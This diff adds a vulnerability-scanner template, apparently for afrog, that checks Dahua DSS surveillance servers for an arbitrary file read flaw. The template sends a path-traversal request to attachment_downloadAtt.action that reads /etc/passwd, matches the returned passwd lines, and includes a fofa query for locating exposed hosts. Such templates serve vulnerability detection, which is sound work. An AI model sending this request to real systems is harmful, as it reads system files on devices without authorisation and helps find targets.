@@ -1,0 +1,22 @@
+id: dahua-dss-attachment-downloadatt-fileread
+
+info:
+  name: Dahua DSS Attachment Downloadatt Fileread
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    大华DSS数字监控系统  attachment_downloadByUrlAtt.action接口存在任意文件读取漏洞
+    fofa: app="dahua-DSS"
+  reference:
+    - https://github.com/zan8in/afrog-pocs/pull/1
+  tags: fileread,dahua
+  created: 2024/12/31
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd
+    expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
